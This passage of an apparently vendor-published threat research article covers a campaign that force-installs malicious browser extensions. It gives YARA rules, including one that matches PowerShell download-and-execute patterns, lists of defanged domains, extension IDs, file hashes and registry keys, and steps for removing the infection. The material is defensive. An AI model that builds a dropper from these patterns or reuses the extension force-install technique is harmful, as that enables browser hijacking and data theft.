srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg54.be5fb179.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg54.be5fb179.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg54.be5fb179.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Devtool.js - sending a message if the user switched to developer tools to inspect the page:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27125%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg55.c6fcd882.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg55.c6fcd882.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg55.c6fcd882.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>After the user’s device has been infected, if they enter “chrome://extensions”, only one of its two extensions can be seen on the page and it is impossible to disable it from here:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27485%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg56.83115cef.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg56.83115cef.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg56.83115cef.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>We can only see evidence of the “Google Updater” local extension loaded into the browser when clicking on the icon of “extensions” on the top of the page.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27484%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg57.58fd1302.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg57.58fd1302.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg57.58fd1302.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Both in VirusTotal and in our database, we can spot more software that claims to be Chrome Setup or Steam updates from the domain of securedatacorner:<a href="https://www.virustotal.com/gui/url/22e7d2d85820b49f1278ce152c5ed39fd88087c7a998dcf348b6164d5b33bb8d/details" target="_blank" rel="noreferrer">https://www.virustotal.com/gui/url/22e7d2d85820b49f1278ce152c5ed39fd88087c7a998dcf348b6164d5b33bb8d/details</a>.</p><h3 id="YARA" class="subtitle1 subtitle1_bold">YARA</h3><p>This basic rule helped us detect a huge amount of malicious first-stage PowerShell scripts:</p><pre class="styles_Article-Code__V7O9i">rule wncld_extension_dropper
{
strings:
 $ = &quot;[System.Reflection.Assembly]::LoadWithPartialName(\&quot;System.Web.Extensions\&quot;)&quot; ascii nocase
 $ = &quot;$uid = &quot; ascii nocase
 $ = &quot;New-Object system.Net.WebClient;&quot;
 $ = &quot;downloadString(&quot; ascii nocase
 $ = &quot;Invoke-Expression&quot; ascii nocase
		
condition:
 filesize &lt; 500KB and all of them
}</pre><p>A general rule for the manifest files of the local extension:</p><pre class="styles_Article-Code__V7O9i">rule wncld_manifest
{
strings:
    $ = &quot;\&quot;devtools_page\&quot;:\&quot;devtools.html\&quot;&quot; ascii nocase
    $ = &quot;\&quot;content_scripts\&quot;:&quot; ascii nocase
    $ = &quot;content.js&quot; ascii nocase
    $ = &quot;\&quot;matches\&quot;: [\&quot;&lt;all_urls&gt;\&quot;]&quot; ascii nocase
    $ = &quot;\&quot;run_at\&quot;: \&quot;document_idle\&quot;&quot; ascii nocase
    $ = &quot;extensions_page.js&quot; ascii nocase
    $ = &quot;\&quot;matches\&quot;: [\&quot;chrome://extensions/*\&quot;]&quot; ascii nocase
    $ = &quot;\&quot;permissions\&quot;:&quot; ascii nocase
    $ = &quot;unsafe-eval&quot; ascii nocase
    $ = &quot;storage&quot; ascii nocase
    $ = &quot;webRequestBlocking&quot; ascii nocase	

condition:
uint16(0) == 0xa7b
        and
        filesize &lt; 1500KB
        and
        all of them
}</pre><h2 id="IOCS" class="h3 h3_bold">IOCS</h2><p>Virus Total<!-- --> <a href="https://www.virustotal.com/gui/collection/04480b9dc7eb0e7150ff89df24c8f30f11f40714b93a1cab00712bde7019fc55" target="_blank" rel="noreferrer">collection and graph with IOCs</a>.</p><p>Signers:<ul><li>Tommy Tech LTD</li></ul></p><p>Domains:<ul><li>http[:]//wincloudservice[.]com/apps/$uid</li><li>http[:]//sslwindows[.]com/apps/$uid</li><li>securedatacorner[.]com</li><li>Nvoptimie[.]com</li><li>nvoptimizer[.]com</li><li>Customsearchbar[.]me</li><li>yoursearchbar[.]me</li><li>activesearchbar[.]me</li><li>msf-console[.]com</li><li>msf-edge[.]com</li><li>search-good[.]com</li><li>Microsearch[.]me</li><li>yglsearch[.]com</li><li>qcomsearch[.]comlaxsearch[.[comqtrsearch[.]comSafesearcheng[.]com</li><li>simplenewtab[.]com</li><li>Wonderstab[.]com</li><li>searchnukes[.]com</li><li>exyzsearch[.]com</li><li>kondoserp1[.]com</li></ul></p><p>Extension IDs:<ul><li>“Google Updater” (local extension)</li></ul></p><p>Chrome:<ul><li>nniikbbaboifhfjjkjekiamnfpkdieng - “Custom Search Bar” - 40K+ users</li><li>nlmpchkfhgoclkajbifladignhbanjdk- “yglSearch” - 40K+ users</li><li>bcmmbhidjmodkbeidljmhcijhkchokcj - “Qcom search bar” - 40+ users</li><li>gdamghfpmkabflbpldhdpbbfofolgaji - “Qtr Search” - 6K+ users</li><li>bbgbmlkfflffccognkcbbmkakbejnado - “Micro Search Chrome Extension” - 180K+ users (removed from Chrome store)</li><li>pkofdnfadkamabkgjdjcddeopopbdjhg - “Active Search Bar” - 20K+ users (removed from Chrome store)</li><li>dafkaabahcikblhbogbnbjodajmhbini- “Your Search Bar” - 40K+ users (removed from Chrome store)</li><li>lfdkgganmodljeaemeadfhfhinpldmnf - “Safe Search Eng” - 35K+ users (removed from Chrome store)</li><li>pjomkeecbjnbpmanlbeijbkahooibopk - “Lax Search” - 600+ users (removed from Chrome store)</li></ul></p><p>Edge:<ul><li>fodkmcnpjapcffbmhelopfjhlmdmnbll - “Simple New Tab” - 100,000K+ users (removed from Edge store)</li><li>Cmodflldkmidgkmpkllldpcmplemgoab - “Cleaner New Tab” - 2K+ users (removed from Edge store)</li><li>Docmlpbiejclgidiacmjpkpoojgiacgn - “NewTab Wonders” - 7K+ users (removed from Edge store)</li><li>dbncciiegloaglpkgjpjhfahaiopfppa - “SearchNukes” - 1K+ users (removed from Edge store</li><li>ljgodogldijlkialfpccoekklegilffm - “EXYZ Search” - 1K+ users - this extension was registered with the same email of the creator of “Custom Search Bar”, removed from Edge store)</li><li>Odpgdmpimkafpjaihemmmmlalofkfpic - “Wonders Tab” - 6K+ users (removed from Edge store)</li></ul></p><p>PowerShell scripts:<ul><li>C:\Windows\system32\Privacyblockerwindows.ps1</li><li>C:\Windows\system32\Windowsupdater1.ps1</li><li>C:\Windows\system32\WindowsUpdater1Script.ps1</li><li>C:\Windows\system32\Optimizerwindows.ps1</li><li>C:\Windows\system32\Printworkflowservice.ps1</li><li>C:\Windows\system32\NvWinSearchOptimizer.ps1 - 2024 version</li><li>C:\Windows\system32\kondserp_optimizer.ps1 - May 2024 version</li><li>The contents of the invoked script: (new 2024 version - 9.8)</li><li><a href="https://www.virustotal.com/gui/file/5ce016d3133d960f68b0415d5bb825b143713ffaea751b098ffcf80353bc171b/content" target="_blank" rel="noreferrer">https://www.virustotal.com/gui/file/5ce016d3133d960f68b0415d5bb825b143713ffaea751b098ffcf80353bc171b/content</a></li></ul></p><p>Third-stage scripts (extension files fetched from C2):<ul><li>C:\Windows\InternalKernelGrid\analytics.js - 52f2f69805f9790502eb36d641575d521c4606a2</li><li>C:\Windows\InternalKernelGrid\background.html - 3b9af4dffbd426873fff40a0bb774a722873b6c7</li><li>C:\Windows\InternalKernelGrid\bg.js - da037a7d75e88e4731afe6f3f4e9c36f90bf1854</li><li>C:\Windows\InternalKernelGrid\bg_fallback.js - d62c4654ba1ebb693922d2ecbb77d1e6d710bce7</li><li>C:\Windows\InternalKernelGrid\config.js - b6ab97623171964f36ba41389d6bcd4ce2c3db8c - endless multiple hashes, this script contains the UID of the infected user, thus different hash for each user</li><li>C:\Windows\InternalKernelGrid\content.js - 58f231f5b70d92fca99e76c5636f25990a173d69</li><li>C:\Windows\InternalKernelGrid\crypto-js.min.js - bde186152457cacf9c35477b5bdda5bcb56b1f45</li><li>C:\Windows\InternalKernelGrid\crypto.js - 635cf72f978b29dc9c8aac09ea53bc68c2c8681b</li><li>C:\Windows\InternalKernelGrid\devtools.html - 0885fd3ef0d221951e69f9424d4a4c3bda4c27f6</li><li>C:\Windows\InternalKernelGrid\devtools.js - da884c769261c0b4dce41d4c9bcdb2672f223fd4</li><li>C:\Windows\InternalKernelGrid\extensions_page.css - da884c769261c0b4dce41d4c9bcdb2672f223fd4</li><li>C:\Windows\InternalKernelGrid\extensions_page.js - 96c6cc391821604c787236061facc5c9a0106a74</li><li>C:\Windows\InternalKernelGrid\icon.png - c2cd89e1ce6c05188b425bba816ffd5f56f7e562</li><li>C:\Windows\InternalKernelGrid\manifest.json - 2a000fd4789def61f3c4eb19d237ca7c883515bf</li><li>C:\Windows\InternalKernelGrid\version.txt - 06d06bb31b570b94d7b4325f511f853dbe771c21</li><li>rc.js - 0dfce59bee9ac5eb2b25508056df2225ef80552f</li><li>C:\Windows\InternalKernelGrid3\bg.js - 29c4cb1faa2e6f0a4352d01d8b8679cef13c5e63</li><li>C:\Windows\InternalKernelGrid4\bg.js - bbd51d7ac6e44d41c32a546b35c9d9cfc3abafee</li><li>C:\windows\internalkernelgrid3\extensions_page.js - 3db731f11d9c85c9d2dcabee6ff8beeeee97fd7d</li><li>C:\windows\internalkernelgrid4\extensions_page.js - 88baaa2eefe27ad5d2bc387a5ad96f507cbf00c1</li><li>C:\Windows\InternalKernelGrid4\config.js - 3406ab5de89be8784124e60ff69f57252caa695b- endless multiple hashes, this script contains the UID of the infected user, thus different hash for each user. In kerndelGrid4 the apiDomain is “nvoptimize[.]com”</li></ul></p><p>Existence of these folders:<ul><li>C:\Windows\InternalKernelGrid</li><li>C:\Windows\InternalKernelGrid3</li><li>C:\Windows\ShellServiceLog</li><li>C:\windows\privacyprotectorlog</li><li>C:\Windows\InternalKernelGrid4</li><li>C:\Windows\NvOptimizerLog</li></ul></p><p>Existence of these scheduled tasks:<ul><li>\NvOptimizerTaskUpdater_V2</li></ul></p><p>Registry activity:<ul><li>MACHINE\SOFTWARE\NVOPTIMIZER, InstallLocation, C:\Windows\NvOptimizerLog</li><li>USER\S-1-...\SOFTWARE\NVOPTIMIZER, InstallLocation, C:\Windows\NvOptimizerLog</li><li>MACHINE\SOFTWARE\WOW6432NODE\NVOPTIMIZER, InstallLocation, C:\Windows\NvOptimizerLog</li><li>MACHINE\SOFTWARE\NVOPTIMIZER, ExecFileName, Download_Checkpoint-Setup-v-aj8e3aA.exe</li><li>SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist</li><li>SOFTWARE\\Policies\\Microsoft\\Edge\\ExtensionInstallForcelist</li></ul></p><p>Installer URL examples (not all are included):<ul><li>https[://]dn[.]keepass[.]tech[/]api[/]download[?]app</li><li>https[://]winautoclicker[.]com/app/AutoClicker_x64LTS.exe</li><li>https[://]downloadbucket1x.s3.eu-west-1.amazonaws[.]com/FPSUnlocker_x64.exe</li><li>https[://]4kdownloads[.]com/app/4kvideodownloader_4.1_x64LTS.exe</li><li>https[://]fpsunlockers[.]com/app/FPSUnlocker_4.1_x64LTS.exe</li><li>https[://]emu-dolphin[.]com/app/dolphin-x64-5.1.exe</li><li>https[://]pcgameloop[.]com/app/GLP_installer_900221846.exe</li><li>https[://]tiktok.4kdownloads[.]com/app/TikTokDownloader_3.1_ex64LTS.exe</li><li>https[://]insta.4kdownloads[.]com/app/Insta4kDownloader_ex64LTS.exe</li><li>https[://]cdn.googlstaticontent[.]com/DesktopApp/YouTubeAppSetup.exe</li><li>https[://]insta.4kdownloads[.]com/app/Insta4kDownloader_x64LTS.exe</li><li>https[://]rummi.mrgameshub[.]com/app/RummikubSetup_ex64LTS.exe</li><li>https[://]wordle.mrgameshub[.]com/app/Wordle_x64LTS.exe</li><li>https[://]securedatacorner[.]com/exe/download/SteamSetup.exe</li><li>https[://]securedatacorner[.]com/exe/download/ChromeSetup.exe</li></ul></p><p>More hashes:<ul><li>3c3289569465f6888bb5f5d75995a12a9e8b9b8a</li><li>0cdc202ba17c952076c37c85eece7b678ebaeef9</li><li>Bf0eacb1afb00308f87159f67eb3f30d63e0cb62</li><li>485a7123de0eaef12e286b04a65cd79157d47fb4</li><li>B57022344af1b4cf15ead0bb15deacc6acb6ff18</li><li>3bd71a7db286e4d73dd6a3b8ce5245b982cad327</li><li>C2ea4ea024d5996acb23297c1bff7f131f29311a</li><li>6ca66f2ecbfdca6de6bcf3ec8dc9680eb1eea28c</li><li>02eb1f019d41924299d71007a4c7fd28d009563a</li><li>0c89668954744ae7deb917312bdbea9da4cc5ec7</li><li>6ca66f2ecbfdca6de6bcf3ec8dc9680eb1eea28c</li><li>B295c9fd32eb12401263de5ec44c8f86b94938c3</li><li>06941262e1361c380acb6f04608ed5ae7d1c9d32</li><li>24ad4e22bfd9a7b1238c04584d1c11ba747a59c7</li><li>2c0dfb4016fb7ad302b56dc8d9b98d260b094210</li><li>A8f4eab0b73f5056489d36eb957bd0a70c6c9e6c</li><li>6bd339650f09170f3d6995ae210340aa2c86956e</li><li>593b10280a926134839feb8e2f9d0da9ee9c0593</li><li>6bd339650f09170f3d6995ae210340aa2c86956e</li><li>7de95a8e148bfae7b671c086dd6dcffc9e796020</li><li>71a0cce57881714af2558fcb3d86814e8e13e659</li><li>485a7123de0eaef12e286b04a65cd79157d47fb4</li><li>ffdcd5acc8d5dc153ba2d7747de0c97603303e75</li><li>32d3d554b4c1ba5727fccc097b8f9973921e029a</li><li>7dc484d089584e93bb04652e1667854630b12d42</li><li>a0576d244e8c15752113534c802e4cd9f68e8e49</li><li>e1f8024441f84019b3124038b19e091b7214ca34</li><li>06941262e1361c380acb6f04608ed5ae7d1c9d32</li><li>A7ff4146d7ab62fc8922d77a57086d8ff6f257cf</li><li>C4f464637bfbfc31b7af53a43e6d3c74877796ac</li><li>2a000fd4789def61f3c4eb19d237ca7c883515bf</li></ul></p><h2 id="hretma" class="h3 h3_bold">How To Remove This Extension Trojan Malware Attack</h2><p>We’ve seen many users online enraged by the phenomenon of forcefully installed extensions on their PC, some of the users mistake this for malware within their browser and think that if they remove and install the browser again the problem will go away. The only way to successfully remove this malware is to make sure that it’s persistence mechanisms are gone. To do so, one must need to delete the scheduled task that re-activates the malware each day, and remove some registry keys. Below is a guide with step-by-step instructions on how to remove the threat.</p><h3 id="rst" class="subtitle1 subtitle1_bold">Removing The Scheduled Task</h3><ol><li>Click on the start menu \ press Winkey.</li><li>Type “Task scheduler” and click on it.</li><li>Once opened, click on “Task Scheduler Library”, which shows all of the tasks on the machine.</li><li>The task name of the malware varies so you will need to identify it based on the following characteristics:</li><li>When you click on a task from the list, it will open its details on the bottom half of the screen. Click on “Actions”.</li><li>In the table below “Actions”, see if the “Details” contains a path to “c:\windows\system32” and a PowerShell script, which is a file that ends with “.ps1”. For example, “C:\Windows\system32\Printworkflowservice.ps1”.</li><li>The task name will often be similar to the Powershell script name.</li><li>Once you identified the malicious task, right click on it’s name.</li><li>Click on “Delete”.</li></ol><h3 id="rrk" class="subtitle1 subtitle1_bold">Removing The Registry Keys</h3><ol><li>To remove the registry keys that are forcing the extensions on browsers, following these directions:</li><li><ol type="a"><li>Click on the start menu \ press Winkey.</li><li>Type “Registry Editor” and click on it.</li><li>Go to: “Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist”.</li><li>In the right pane of the screen, there will be a list of extensions with a numerical value as “Name” and ExtensionID as “Data”.</li><li>Right click on the name.</li><li>Click “Delete”.</li><li>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Google\Chrome\ExtensionInstallForcelist.</li><li>Repeat the same process for Edge Extensions at the path “Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist”.</li></ol></li></ol><h3 id="dmf" class="subtitle1 subtitle1_bold">Deleting Malware Files</h3><p>At this point, the malware should not run again and the browser should be clean from the rouge extensions.</p><p>*warning*: make sure not to delete entire folder like “System32”. Those folders are important and not malicious. Carefully delete only files that match the list we provided and nothing else.</p><p>To get rid of the malware files, use following steps. Based on the IOCs list above, you can search your computer for the existence of the folders and powershell scripts. When you find them, right click and choose “Delete”.</p><ol><li>Click on the start menu \ press Winkey.</li><li>Type “File Explorer” and click on it.</li><li>Click on “This PC” and then on “Windows” (or the drive letter).</li><li>Go to Windows → System32.</li><li>Search for a powershell script that matches one of the above names from the IOCs list.</li><li>Right click on it and choose “Delete”.</li><li>Go back to “Windows” folder.</li><li>Search for a folder with a name that matches one of the above names from the IOCs list.</li><li>Right click on it and choose “Delete”.</li></ol><p>Alternatively, installing an antivirus can also remove the threat for you.</p><h2 id="wpma" class="h3 h3_bold">Ways To Prevent Malware Attacks</h2><p>As we stated earlier, this research article intends to shed light on this ongoing threat, highlight the larger issue of Chrome extension malware, and advocate for ways to prevent malware attacks. As the web extension economy has grown, so too have the cyber threats around extensions. Users everywhere must be made aware of these threats and look out for any possible signs that they might be affected.</p><p>In this specific case, while some users might not feel like they’re experiencing malicious activity, in reality, their devices have been compromised and so too is their data. The script we found receives information from the operator’s C2 server, so there may be other extensions that have not occurred to us that are causing harm.</p><p>Users should look to next-generation antivirus software like<!-- --> <a href="/platform/products/endpoint-protection">RAV Endpoint</a> <!-- -->Protection or advanced endpoint security tools like the<!-- --> <a href="/platform/products/online-security">Online Security</a> <!-- -->browser extension for defenses against malware, identity theft, and more. The responsibility, however, must not fall solely on the end user. Antivirus providers and makers of endpoint protection software must prioritize these relatively new threats to safeguard their users.</p></article></main><div class="Related_Related__13IMe"><div class="Related_Related-Inner__ikNsF"><div class="Related_Related-Content__75WHQ"><h3 class="Related_Related-Head__Ujh8J subtitle1 subtitle1_bold">Latest Research</h3><div class="Related_List__xYiha"><ul class="Related_List-List__172fr"><a href="/blog/covid-19-info-stealer-the-map-of-threats-threat-analysis-report"><li class="Related_List-Item__1TdQk"><div class="Related_List-Image__mxviF"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:absolute;top:0;left:0;bottom:0;right:0"><img alt="img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover"/><noscript><img alt="img" sizes="100vw" srcSet="/images/articles/thumbnails/covid-19-threat-analysis-report.svg 320w, /images/articles/thumbnails/covid-19-threat-analysis-report.svg 576w, /images/articles/thumbnails/covid-19-threat-analysis-report.svg 768w, /images/articles/thumbnails/covid-19-threat-analysis-report.svg 992w, /images/articles/thumbnails/covid-19-threat-analysis-report.svg 1200w, /images/articles/thumbnails/covid-19-threat-analysis-report.svg 1400w" src="/images/articles/thumbnails/covid-19-threat-analysis-report.svg" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover" loading="lazy"/></noscript></span></div><span class="Related_List-Title__QRzvn">COVID-19, Info Stealer &amp; the Map of Threats; Threat Analysis Report</span></li></a><a href="/research/dealing-with-javascript-obfuscations-part-1"><li class="Related_List-Item__1TdQk"><div class="Related_List-Image__mxviF"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:absolute;top:0;left:0;bottom:0;right:0"><img alt="img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover"/><noscript><img alt="img" sizes="100vw" srcSet="/images/articles/thumbnails/js-obfuscation-1.svg 320w, /images/articles/thumbnails/js-obfuscation-1.svg 576w, /images/articles/thumbnails/js-obfuscation-1.svg 768w, /images/articles/thumbnails/js-obfuscation-1.svg 992w, /images/articles/thumbnails/js-obfuscation-1.svg 1200w, /images/articles/thumbnails/js-obfuscation-1.svg 1400w" src="/images/articles/thumbnails/js-obfuscation-1.svg" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover" loading="lazy"/></noscript></span></div><span class="Related_List-Title__QRzvn">Dealing with JavaScript Obfuscations — Part 1</span></li></a><a href="/research/dealing-with-javascript-obfuscations-part-2"><li class="Related_List-Item__1TdQk"><div class="Related_List-Image__mxviF"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:absolute;top:0;left:0;bottom:0;right:0"><img alt="img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover"/><noscript><img alt="img" sizes="100vw" srcSet="/images/articles/thumbnails/js-obfuscation-2.svg 320w, /images/articles/thumbnails/js-obfuscation-2.svg 576w, /images/articles/thumbnails/js-obfuscation-2.svg 768w, /images/articles/thumbnails/js-obfuscation-2.svg 992w, /images/articles/thumbnails/js-obfuscation-2.svg 1200w, /images/articles/thumbnails/js-obfuscation-2.svg 1400w" src="/images/articles/thumbnails/js-obfuscation-2.svg" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover" loading="lazy"/></noscript></span></div><span class="Related_List-Title__QRzvn">Dealing with JavaScript Obfuscations — Part 2</span></li></a></ul><div class="Related_List-ProgressContainer__G7pyh"><div class="Related_List-ProgressBar__S0bQC"></div></div></div><div class="Related_Related-Delimiter__5GV_x"></div><h3 class="Related_Related-Head__Ujh8J subtitle1 subtitle1_bold">Discover More</h3><div class="Related_List__xYiha"><ul class="Related_List-List__172fr"><a href="/blog/2024-consumer-cybersecurity-pulse-report"><li class="Related_List-Item__1TdQk"><div class="Related_List-Image__mxviF"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:absolute;top:0;left:0;bottom:0;right:0"><img alt="img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover"/><noscript><img alt="img" sizes="100vw" srcSet="/images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 320w, /images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 576w, /images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 768w, /images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 992w, /images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 1200w, /images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg 1400w" src="/images/articles/thumbnails/2024-consumer-cybersecurity-pulse-report.svg" decoding="async" data-nimg="fill" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:cover" loading="lazy"/></noscript></span></div><span class="Related_List-Title__QRzvn">2024 Consumer Cybersecurity Pulse Report</span></li></a></ul><div class="Related_List-ProgressContainer__G7pyh"><div class="Related_List-ProgressBar__S0bQC"></div></div></div></div></div></div></div><div class="Footer_wrapper__chorF"><div class="Footer_Footer__wOtNb text_footer"><div class="Footer_Footer-SocialBlock__zm2MH"><div class="Footer_Footer-Logo__gyxRu"><a href="/"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;padding-top:17.272727272727273%"></span><img alt="footer logo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="footer logo" sizes="100vw" srcSet="/_next/static/media/logo-reason-labs.884f8136.svg 320w, /_next/static/media/logo-reason-labs.884f8136.svg 576w, /_next/static/media/logo-reason-labs.884f8136.svg 768w, /_next/static/media/logo-reason-labs.884f8136.svg 992w, /_next/static/media/logo-reason-labs.884f8136.svg 1200w, /_next/static/media/logo-reason-labs.884f8136.svg 1400w" src="/_next/static/media/logo-reason-labs.884f8136.svg" decoding="async" data-nimg="responsive" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" 